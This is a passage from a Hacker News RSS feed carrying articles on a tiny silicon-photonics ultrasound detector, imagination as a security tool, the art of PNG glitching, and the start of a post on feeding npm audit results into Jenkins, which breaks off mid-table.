            <guid isPermaLink="false">hacker-news-small-sites-24520556</guid>
            <pubDate>Fri, 18 Sep 2020 18:52:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The world‚Äôs smallest ultrasound detector]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24520424">thread link</a>) | @finphil
<br/>
September 18, 2020 | https://nuadox.com/post/629622124808749056/smallest-ultrasound-detector | <a href="https://web.archive.org/web/*/https://nuadox.com/post/629622124808749056/smallest-ultrasound-detector">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> 
                 
                    
                    <article id="629622124808749056">
                        <div>
                            <div>
                                <a href="https://nuadox.com/post/629622124808749056/smallest-ultrasound-detector"><h2>The world‚Äôs smallest ultrasound detector</h2></a>
                                <figure data-orig-width="1920" data-orig-height="1080"><img src="https://64.media.tumblr.com/8b4391500528657ca313da58498378f4/d11322854d4824f5-52/s1280x1920/78d1a45475ad319acfc6092a66197792ab8c3c7f.png" data-orig-width="1920" data-orig-height="1080" width="1280" height="720" alt="image"></figure><p><b>- By <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.helmholtz-muenchen.de%2Fen%2F&amp;t=MTllN2E1OGM5YjFlYjk5ZGZlYWM1NWZjMzQ2OWI0Mzc0ODEzYWY0YywwYlNqdmdxUw%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F629622124808749056%2Fsmallest-ultrasound-detector&amp;m=0&amp;ts=1600676731">Helmholtz Zentrum M√ºnchen /&nbsp;German Research Center for Environmental Health</a> -</b></p><p>

Researchers at Helmholtz Zentrum M√ºnchen and the Technical University of Munich (TUM) have developed the world‚Äôs smallest ultrasound detector. It is based on miniaturized photonic circuits on top of a silicon chip. With a size 100 times smaller than an average human hair, the new detector can visualize features that are much smaller than previously possible, leading to what is known as super-resolution imaging.

<br></p><p>Since the development of medical ultrasound imaging in the 1950s, the core detection technology of ultrasound waves has primarily focused on using piezoelectric detectors, which convert the pressure from ultrasound waves into electric voltage. The imaging resolution achieved with ultrasound depends on the size of the piezoelectric detector employed. Reducing this size leads to higher resolution and can offer smaller, densely packed one or two dimensional ultrasound arrays with improved ability to discriminate features in the imaged tissue or material. However, further reducing the size of piezoelectric detectors impairs their sensitivity dramatically, making them unusable for practical application.</p><h2><b>Using computer chip technology to create an optical ultrasound detector</b></h2><p>Silicon photonics technology is widely used to miniaturize optical components and densely pack them on the small surface of a silicon chip. While silicon does not exhibit any piezoelectricity, its ability to confine light in dimensions smaller than the optical wavelength has already been widely exploited for the development of miniaturized photonic circuits.</p><p>Researchers at Helmholtz Zentrum MuÃànchen and TUM capitalized on the advantages of those miniaturized photonic circuits and built the world‚Äôs smallest ultrasound detector: the silicon waveguide-etalon detector, or SWED. Instead of recording voltage from piezoelectric crystals, SWED monitors changes in light intensity propagating through the miniaturized photonic circuits.</p><figure data-orig-width="1440" data-orig-height="1440"><img src="https://64.media.tumblr.com/881a91ad3ca89cc9468739054de1b5bd/d11322854d4824f5-5e/s1280x1920/bbc0cc85dfc9afaa3c093fd1f81b9c72941b3c01.jpg" data-orig-width="1440" data-orig-height="1440" width="1280" height="1280" alt="image"></figure><p><i>Image: Silicon chip (approx. 3 mm x 6 mm) with multiple detectors. The fine black engravings on the surface of the chip are the photonics circuits interconnecting the detectors (not visible with bare eyes). In the background a larger scale photonics circuit on a silicon wafer. Credit:&nbsp;

<a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.helmholtz-muenchen.de%2Fen%2Faktuelles%2Flatest-news%2Fpress-information-news%2Farticle%2F48828%2Findex.html&amp;t=NDNlMDBjMDRkYjBhZGFiMTAxMWE2YWQ1MTQ4MGU0ODVlNGQxNjZlNiwwYlNqdmdxUw%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F629622124808749056%2Fsmallest-ultrasound-detector&amp;m=0&amp;ts=1600676731">¬© Helmholtz Zentrum Muenchen / Roman Shnaiderman</a>.</i></p><p>‚ÄúThis is the first time that a detector smaller than the size of a blood cell is used to detect ultrasound using the silicon photonics technology‚Äù, says Rami Shnaiderman, developer of SWED. ‚ÄúIf a piezoelectric detector was miniaturized to the scale of SWED, it would be 100 million times less sensitive.‚Äù</p><h2><b>Super-resolution imaging</b></h2><p>‚ÄúThe degree to which we were we able to miniaturize the new detector while retaining high sensitivity due to the use of silicon photonics was breathtaking‚Äù, says Prof. Vasilis Ntziachristos, lead of the research team. The SWED size is about half a micron (=0,0005 millimeters). This size corresponds to an area that is at least 10,000 times smaller than the smallest piezoelectric detectors employed in clinical imaging applications. The SWED &nbsp;is also up to 200 times smaller than the ultrasound wavelength employed, which means that it can be used to visualize features that are smaller than one micrometer, leading to what is called super-resolution imaging.</p><h2><b>Inexpensive and powerful</b></h2><p>As the technology capitalizes on the robustness and easy manufacturability of the silicon platform, large numbers of detectors can be produced at a small fraction of the cost of piezoelectric detectors, making mass production feasible. This is important for developing a number of different detection applications based on ultrasound waves. ‚ÄúWe will continue to optimize every parameter of this technology ‚Äì the sensitivity, the integration of SWED in large arrays, and its implementation in hand-held devices and endoscopes‚Äù, adds Shnaiderman.</p><h2><b>Future development and applications</b></h2><p>‚ÄúThe detector was originally developed to propel the performance of optoacoustic imaging, which is a major focus of our research at Helmholtz Zentrum M√ºnchen and TUM. However, we now foresee applications in a broader field of sensing and imaging‚Äù, says Ntziachristos.</p><p>While the researchers are primarily aiming for applications in clinical diagnostics and basic biomedical research, industrial applications may also benefit from the new technology. The increased imaging resolution may lead to studying ultra-fine details in tissues and materials. A first line of investigation involves super-resolution optoacoustic (photoacoustic) imaging of cells and micro-vasculature in tissues, but the SWED could be also used to study fundamental properties of ultrasonic waves and their interactions with matter on a scale that was not possible before.</p><h2><b>Collaboration and patenting</b></h2><p>The Institute of Biological and Medical Imaging at Helmholtz Zentrum M√ºnchen, the Chair of Biological Imaging at TUM, and TranslaTUM ‚Äì the Central Institute for Translational Cancer Research at TUM‚Äôs university hospital Klinikum Rechts der Isar, have contributed equally to this new technology which was published in the journal <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.nature.com%2Farticles%2Fs41586-020-2685-y&amp;t=MzY0NTkxMzhiODFjODQ5OTRmMjUzNTQ1NWJmYmMxZDZjYzBkYzJmZCwwYlNqdmdxUw%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F629622124808749056%2Fsmallest-ultrasound-detector&amp;m=0&amp;ts=1600676731"><i>Nature</i></a>. Protection of the intellectual aspects of this technology is ongoing. </p><p>‚Äì</p><p><b>Source:&nbsp;<a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.helmholtz-muenchen.de%2Fen%2Faktuelles%2Flatest-news%2Fpress-information-news%2Farticle%2F48828%2Findex.html&amp;t=NDNlMDBjMDRkYjBhZGFiMTAxMWE2YWQ1MTQ4MGU0ODVlNGQxNjZlNiwwYlNqdmdxUw%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F629622124808749056%2Fsmallest-ultrasound-detector&amp;m=0&amp;ts=1600676731">Helmholtz Zentrum M√ºnchen / German Research Center for Environmental Health</a></b></p><p><b>Full study:</b>&nbsp;‚ÄúA submicrometre silicon-on-insulator resonator for ultrasound detection‚Äù, <i>Nature</i>.</p><p><a href="https://t.umblr.com/redirect?z=http%3A%2F%2Fdx.doi.org%2F10.1038%2Fs41586-020-2685-y&amp;t=NDc1MTFmYzk4NTcxNGE2MmU0ZjA3YjkxZWM3MTZlNjgyNjkxY2NkMCwwYlNqdmdxUw%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F629622124808749056%2Fsmallest-ultrasound-detector&amp;m=0&amp;ts=1600676731">http://dx.doi.org/10.1038/s41586-020-2685-y</a><br></p><h2><b>Read Also</b></h2><p><a href="https://nuadox.com/post/178125297442/new-wearable-ultrasound-patch-ucsd">New wearable ultrasound patch non-invasively monitors blood pressure in arteries</a></p>
                    
                      
                    
                    
                    
                    
                    
                    
                    
                    
                                             
                                <p><span>
                                    <p>
                                    
                                        <a href="https://nuadox.com/tagged/imaging">imaging</a>
                                    
                                        <a href="https://nuadox.com/tagged/ultrasound">ultrasound</a>
                                    
                                        <a href="https://nuadox.com/tagged/optics">optics</a>
                                    
                                        <a href="https://nuadox.com/tagged/physics">physics</a>
                                    
                                        <a href="https://nuadox.com/tagged/nanotechnology">nanotechnology</a>
                                    
                                    </p>
                                </span></p>
                                
<ol><!-- START NOTES --><!-- END NOTES --></ol></div>
                        </div>
                    </article>
                 
                </div></div>]]>
            </description>
            <link>https://nuadox.com/post/629622124808749056/smallest-ultrasound-detector</link>
            <guid isPermaLink="false">hacker-news-small-sites-24520424</guid>
            <pubDate>Fri, 18 Sep 2020 18:42:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Imagination as a Security Tool]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24520268">thread link</a>) | @wglb
<br/>
September 18, 2020 | https://ciexinc.com/blog/imagination/ | <a href="https://web.archive.org/web/*/https://ciexinc.com/blog/imagination/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main">
      

<p>A tool you might not see mentioned often in security literature is imagination. It isn‚Äôt very
technical, and it isn‚Äôt very procedural, but failing to employ your imagination can often lead to
disaster.</p>

<h2 id="if-i-had-only-believed-i-could-win">If I had only believed I could win</h2>

<p>My favorite story is that of a young businessman who wrote about his early hobby of sailing.
He went up against the ‚Äúbig boys‚Äù in a race off Australia. During the middle of the race, he was
further out than the rest of the sailors and he thought he should go closer to their path, nearer
the shore.  Later he realized that if he had simply taken the water temperature with his
thermometer, he would have seen that he was on a faster path and finished much earlier. He notes ‚ÄúIf
I had only believed that I could win, I would have.‚Äù</p>

<p>Also consider <em>‚ÄúThe Empire doesn‚Äôt consider a small, one-man fighter to be any threat.‚Äù</em> -‚Äî Rebel General Dodonna,
 shortly before a small, one-man fighter destroys the Death Star.</p>

<p>Some failures of imagination are more severe.  Do you remember one of our leaders standing in the
rubble of New York buildings saying ‚ÄúWho could have imagined this would happen.‚Äù Well, the
people who did it is who.</p>

<h2 id="defense-by-presumed-motive">Defense by presumed motive</h2>

<p>In talking to teams about how to build defenses, I often hear  ‚ÄúWell, if the attackers
get into one of my servers, the database is encrypted so they can‚Äôt get anything.‚Äù  There are
several problems with this thinking.  First, if attackers can get into a server, you probably need
to presume serious compromise. There is likely a way for them to find the keys that encrypt the
database.</p>

<p>From the standpoint of imagination, it presumes that attackers are after the one specific thing
that you are worried about‚Äìa very important asset.  What is likely valuable to the attacker is
control at any level of the server, not just the main jewels.</p>

<p>In doing <a href="https://gdpr-info.eu/">GDPR</a> review, it‚Äôs clear that most companies have significant
personally-identifiable information in places they may not realize, and further that this
information is shared with other entities in a way that isn‚Äôt tracked.</p>

<p>If this data is not on your list of key assets, it is easy to overlook that this might be a target.</p>

<p>It is likely true that there are other internal targets‚Äìlarge and small‚Äìthat can be useful to
attackers. Discovery of those can be used as jumping off points for further ‚Äúexploration‚Äù.</p>

<h2 id="what-could-possibly-go-wrong">What could possibly go wrong</h2>

<p>I have stickers that I like to share when I meet people or when someone leaves something
unlocked. It is usually met with humor, but the underlying message is serious: The ‚ÄúWhat Could
Possibly Go Wrong‚Äù mindset is a good one to have when thinking about the security of your software,
your AWS configuration, or your (unlocked) rack of building keys in the subbasement. I once
encountered an elevator control panel that swung open to reveal the internal wiring. I placed a
sticker there to help the repairman. A colleague left their wallet in a position highly visible from
the hallway, just inside the door. I carefully opened the wallet and placed sticker inside,
hopefully conveying the proper message.</p>

<p>While these stickers are usually seen as humorous, they illustrate an attitude that I think is
necessary as a defender of information assets. An unlocked terminal, which is often the target of
these stickers, can be an attacker‚Äôs gateway to the rest of the network or cloud resources.</p>

<p>This is useful to identify specific threats and can also be a useful message to people who are not
security-aware.</p>

<h2 id="diversity">Diversity</h2>

<p>I‚Äôve worked for companies that make a serious effort in their hiring efforts‚Äìto recruit and hire
folks across many cultures, dispositions, genders, and backgrounds. But once hired, the internal
culture is essentially monolithic, with not much out-of-the-box thinking. Being all on the same page
is important to the mission of the company.  From a security perspective, any company with
information online (and who doesn‚Äôt conduct business in one form or another these days?) is facing
risks that are way out of the box. A recent widespread attack found thousands unprotected databases,
removed them, and replaced them with a string containing ‚Äúmeow‚Äù. No reason is given, and there is no
evident purpose. Who could have imagined.</p>

<h2 id="thinking-out-of-the-box">Thinking out of the box</h2>

<p>How do I increase my imagination, you might ask.</p>

<p>A twitter account <a href="https://twitter.com/badthingsdaily?lang=en">Bad Things Daily</a>, which isn‚Äôt
actually updated daily, has a litany of things to stimulate you imagination and keep you up at
night. These can be fodder for tabletop exercises. The latest scary one is ‚ÄúThe company managing
your <a href="https://en.wikipedia.org/wiki/Mobile_device_management">MDM</a> has unenrolled your endpoint
agents and walked away. Managed <a href="https://en.wikipedia.org/wiki/FileVault">FileVault</a> keys are now
inaccessible.‚Äù Your endpoints are now no longer under your control.</p>

<h2 id="source-of-ideas">Source of ideas</h2>

<p>In addition to reading scary twitter feeds, a little time spent in reading ideas outside your
immediate responsibilities can feed your imagination. I‚Äôve always felt that science fiction can
lead to a wider perspective.</p>

<h2 id="in-conclusion">In conclusion</h2>

<p>The systems that you are asked to defend are under attack, often from sources unknown, by methods
that may not be immediately evident. We need many tools, including logging, monitoring, red-teaming
our own infrastructure, but also imagination to be open to anticipating and recognizing attacks that
are unusual.</p>


    </div></div>]]>
            </description>
            <link>https://ciexinc.com/blog/imagination/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24520268</guid>
            <pubDate>Fri, 18 Sep 2020 18:31:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Art of PNG Glitch]]>
            </title>
            <description>
<![CDATA[
Score 39 | Comments 9 (<a href="https://news.ycombinator.com/item?id=24520201">thread link</a>) | @pmoriarty
<br/>
September 18, 2020 | https://ucnv.github.io/pnglitch/ | <a href="https://web.archive.org/web/*/https://ucnv.github.io/pnglitch/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    <header>
      <a title="PNGlitch" href="https://github.com/ucnv/pnglitch/"><img src="https://ucnv.github.io/pnglitch/files/forkme.png" alt="PNGlitch"></a>
      
    </header>
    <section>
      <h2>Overview</h2>
      <p>
      PNG is an image format that has a history of development beginning in 1995, and it is still a popular, long living format. Generally, it is known for its features such as lossless compression and  the ability to handle transparent pixels. <br>
      However, we do not look at image formats from a general point of view, but rather think of ways to glitch them. When we look at PNG from the point of view of glitch, what kind of peculiarity does it have?
      </p>
      <h3>Checksum</h3>
      <p>
      We should first look into the checksum system of the CRC32 algorithm. It is used to confirm corrupted images, and when it detects corruption in an image file, normal viewer applications refuse to display it. Therefore, it is impossible to generate glitches using simple methods such as rewriting part of the binary data using text editors or binary editors (you will completely fail). In other words, the PNG format is difficult to glitch. <br>
      We need to create glitches accordingly to the PNG specification in order to avoid this failure. This means that we must rewrite the data after decoding CRC32, re-calculate it and attach it to the edited data.
      </p>

      <h3>State</h3>
      <p>
      Next we want to look at the transcode process of PNG. The chart shown below is a simplified explanation of how PNG encoding flows.
      </p>
      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/states.png" alt="Figure 1)  PNG encoding flow">
        <figcaption>Figure 1) PNG encoding flow</figcaption>
      </figure>


      <p>
      Each of the four states that are shown above can be glitch targets. However, glitching the the first ‚ÄúRaw Data‚Äù is the same as glitching BMP, so it technically isn‚Äôt a PNG glitch (at the end, it is the same as PNG with the None filter applied. I will explain this in the next section). The final ‚ÄúFormatted PNG‚Äù glitch will not work because of the checksum system I mentioned above.<br>
      This means that PNG glitches can be made when the ‚ÄúFiltered Data‚Äù or ‚ÄúCompressed Data‚Äù is manipulated. I will explain about filters in the following subsection. When ‚ÄúFiltered Data‚Äù is glitched, it shows a distinctive effect; patterns that look like flower petals scatter around the image. The difference between the filters become clear when the ‚ÄúFiltered Data‚Äù is glitched. On the other hand, ‚ÄúCompressed Data‚Äù glitches are flavored by their own compression algorithm, which is Deflate compression. It shows an effect similar to a snow noise image.
      </p>
      <p>
      There are elements else besides the transcoding process that could also influence the appearance of glitches such as transparent pixels and interlaces.
      </p>
      <h3>Five filters</h3>
      <p>
      The factor that characterizes the appearance of glitches the most is the process called filter. The filter converts the uncompressed pixel data of each scanline using a certain algorithm in order to improve the compression efficiency. There are five types of filters that include four algorithms called Sub, Up, Average and Paeth, and also None (which means no filter applied). PNG images are usually compressed after the most suitable filter is applied to each scanline, and therefore all five filters are combined when PNG images are made.<br>
      These five filters usually only contribute to the compression efficiency, so the output result is always the same no matter which filter is applied. However, a clear difference appears in the output result when the filtered data is damaged. It is difficult to recognize the difference of the filters when an image is optimized and has all five filters combined, but the difference becomes obvious when an image is glitched when the same, single filter is applied to each scanline.<br>
      I will show the difference of the effect that each filter has later on, but when we look close into the results, we will understand which filter is causing which part of the beauty of PNG glitches (yes, they are beautiful) to occur.
      </p>
      <p>
        I will show the actual glitch results in the next section.
      </p>

      <h2>Glitching: In practice</h2>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png.png" alt="Figure 2) Original PNG image"></a>
        <figcaption>Figure 2) Original PNG image</figcaption>
      </figure>
      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-optimized.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-optimized.png" alt="Figure 3) Glitched PNG image"></a>
        <figcaption>Figure 3) Glitched PNG image</figcaption>
      </figure>
      <p>
      I have shown two PNG images above: one is an image before it has been glitched, and one is an image that has been glitched.<br>
      This is a Filtered Data glitch, which I explained in the previous section.<br>
      The original PNG has optimized filters applied to each scanline, and all of the five filters have been combined. The glitch reveals how the five filters were balanced when they were the combined.
      </p>
      <h3>Difference between filters</h3>
      <p>
      Lets look into the difference between each filter type.
      </p>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-none.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-none.png" alt="Figure 4) Glitched PNG, filtered with None"></a>
        <figcaption>Figure 4) Glitched PNG, filtered with None</figcaption>
      </figure>

      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/png-glitch-none-detail.png" alt="Figure 5) Magnified view of fig. 4">
        <figcaption>Figure 5) Magnified view of fig. 4</figcaption>
      </figure>
      <p>
      The image above has applied ‚ÄúNone (no filter)‚Äù, meaning that it is a raw data glitch. Each pixel stands alone in this state and do not have any relationship with the others, so a single re-wrote byte does not have a wide range influence.
      </p>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-sub.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-sub.png" alt="Figure 6) Glitched PNG, filtered with Sub"></a>
        <figcaption>Figure 6) Glitched PNG, filtered with Sub</figcaption>
      </figure>

      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/png-glitch-sub-detail.png" alt="Figure 7) Magnified view of fig. 6">
        <figcaption>Figure 7) Magnified view of fig. 6</figcaption>
      </figure>
      <p>
      This is a glitched image that has the filter ‚ÄúSub‚Äù applied to each scanline. When the Sub algorythm is applied, the target pixel rewrites itself by refering to the pixel that is right next to it. This is why the glitch pattern avalanches towards the right side.
      </p>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-up.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-up.png" alt="Figure 8) Glitched PNG, filtered with Up"></a>
        <figcaption>Figure 8) Glitched PNG, filtered with Up</figcaption>
      </figure>

      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/png-glitch-up-detail.png" alt="Figure 9) Magnified view of fig. 8">
        <figcaption>Figure 9) Magnified view of fig. 8</figcaption>
      </figure>
      <p>
      This is the filter ‚ÄúUp‚Äù. This filter is similar to Sub, but its reference direction is the top and bottom.
      </p>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-average.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-average.png" alt="Figure 10) Glitched PNG, filtered with Average"></a>
        <figcaption>Figure 10) Glitched PNG, filtered with Average</figcaption>
      </figure>

      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/png-glitch-average-detail.png" alt="Figure 11) Magnified view of fig. 10">
        <figcaption>Figure 11) Magnified view of fig. 10</figcaption>
      </figure>
      <p>
      The filter ‚ÄúAverage‚Äù refers to a diagonal direction. It shows a meteor like tail that starts from the damaged pixel. The soft gradation effect is also one of the peculiarities of this filter. The result of a PNG glitch when the Average filter is applied is a glitch that lacks glitchiness, and is also the most delicate portion of PNG glitching.
      </p>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-paeth.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-paeth.png" alt="Figure 12) Glitched PNG, filtered with Paeth"></a>
        <figcaption>Figure 12) Glitched PNG, filtered with Paeth</figcaption>
      </figure>

      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/png-glitch-paeth-detail.png" alt="Figure 13) Magnified view of fig. 12">
        <figcaption>Figure 13) Magnified view of fig. 12</figcaption>
      </figure>
      <p>
      The filter ‚ÄúPaeth‚Äù has the most complicated algorithm when compared with the others. It also has the most complicated glitch effect. The glitch will affect a wide range of areas even with the least byte re-writing. The keynote effect of PNG glitch is caused by this filter; the figure shown in the original image is maintained, but is intensely destroyed at the same time.
      </p>

      <h3>Glitch after compression</h3>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-compressed.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-compressed.png" alt="Figure 14) Glitched PNG, after compressed"></a>
        <figcaption>Figure 14) Glitched PNG, after compressed</figcaption>
      </figure>

      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/png-glitch-compressed-detail.png" alt="Figure 15) Magnified view of fig. 14">
        <figcaption>Figure 15) Magnified view of fig. 14</figcaption>
      </figure>
      <p>
      This is a glitch of the state that I referred to as Compressed Data in the previous section. A snowstorm effect appears, and it is difficult to recognize the original figure in the image. It infrequently remains to show effects of the filters. The image is often completely destroyed.
      </p>
„ÄÄ
      <h3>Transparence</h3>
      <p>
      Lets look into what happens when an image that includes transparent pixels is glitched.
      </p>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-alpha.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-alpha.png" alt="Figure 16) Original PNG image"></a>
        <figcaption>Figure 16) Original PNG image with alpha pixels</figcaption>
      </figure>
      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-alpha.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-alpha.png" alt="Figure 17) Glitched PNG, with alpha pixels"></a>
        <figcaption>Figure 17) Glitched PNG, with alpha pixels</figcaption>
      </figure>
      <p>
      The transparency comes as an effect. Especially the filter ‚ÄúAverage‚Äù seems to blend transparent pixels gradually.
      A 100% gathering of transparent pixels is handled in the same way as a solid colored section. You can tell that the filter ‚ÄúUp‚Äù is often applied to solid colored sections.<br>
      (There is a possibility that newer general-purpose image formats switch their compression scheme of each part depending on if the image is a solid colored section, or else a complicated image such as photographs. The use of images that include solid colored sections for testing glitches is an effective method. One example is a WebP. )
      </p>

      <h3>Interlace</h3>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-interlace.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-interlace.png" alt="Figure 18) Glitched PNG, with interlace"></a>
        <figcaption>Figure 18) Glitched PNG, with interlace</figcaption>
      </figure>
      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/png-glitch-interlace-detail.png" alt="Figure 19) Magnified view of fig. 18">
        <figcaption>Figure 19) Magnified view of fig. 18</figcaption>
      </figure>
      <p>
        PNG interlaces are divided into seven passes, using the Adam7 algorithm based on 8x8 pixels. We are able to visualy observe that algorithm when an interlaced PNG is glitched. We can also confirm a stitched effect, and that its angle has become narrow towards the Average filter (see appendix B).
      </p>

      <h2>Conclusion</h2>
      <p>
      PNG is a very simple format compared to JPEG or other new image formats. The filter algorithms are like toys, and its compression method is the same as oldschool Zip compression. However, this simple image format shows a surprisingly wide range of glitch variations. We would perhaps only need one example to explain a JPEG glitch, but we need many different types of samples in order to explain what a PNG glitch is.<br>
      PNG was developed as an alternative format of GIF. However, when it comes to glitching, GIF is a format that is too poor to be compared with PNG. PNG has prepared surprisingly rich results that have been concealed by the checksum barrier for a long time.
      </p>


      <hr>
    </section>
    <section>

      <h2><a name="appendix-a"></a>Appendix A: PNGlitch library</h2>
      <p>
      The author released <a href="http://www.jarchive.org/akami/aka018.html">a tiny script for PNG glitch</a> in 2010. Back then, it only removed the CRC32 and added it back again after the internal data was glitched.<br>
      Since then, the author has continued to rewrite the script and make improved versions of it for the purpose of using it in his own work, but he decided to make a library that adopts his know-how in 2014. The Ruby library <a href="https://github.com/ucnv/pnglitch">PNGlitch</a> came out as the result.<br>
      Every glitch image that appears in this article is made by using this ‚Ä¶</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ucnv.github.io/pnglitch/">https://ucnv.github.io/pnglitch/</a></em></p>]]>
            </description>
            <link>https://ucnv.github.io/pnglitch/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24520201</guid>
            <pubDate>Fri, 18 Sep 2020 18:26:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[NPM Audit and Jenkins Warnings Next Generation (Custom Groovy Parser)]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24520186">thread link</a>) | @fazlerocks
<br/>
September 18, 2020 | https://uko.codes/npm-audit-jenkins-warnings-next-generation-custom-groovy-parser | <a href="https://web.archive.org/web/*/https://uko.codes/npm-audit-jenkins-warnings-next-generation-custom-groovy-parser">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p>At work, I'm developing some projects that use NPM as a package manager. Starting from version 6, NPM will display short audit information at the end of an <code>npm install</code> execution in the following format:</p>
<pre><code><span>found</span> <span>290</span> vulnerabilities (<span>283</span> low, <span>5</span> moderate, <span>2</span> high)
</code></pre><p>You can also get more detailed information. If you run <code>npm audit</code> you will receive explanations for each vulnerability and also some suggestions about how to fix that. For example:</p>
<pre><code># Run  npm <span>update</span> bl 
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ High          ‚îÇ Remote Memory Exposure                           ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ Package       ‚îÇ bl                                               ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ Dependency <span>of</span> ‚îÇ exceljs                                          ‚îÇ
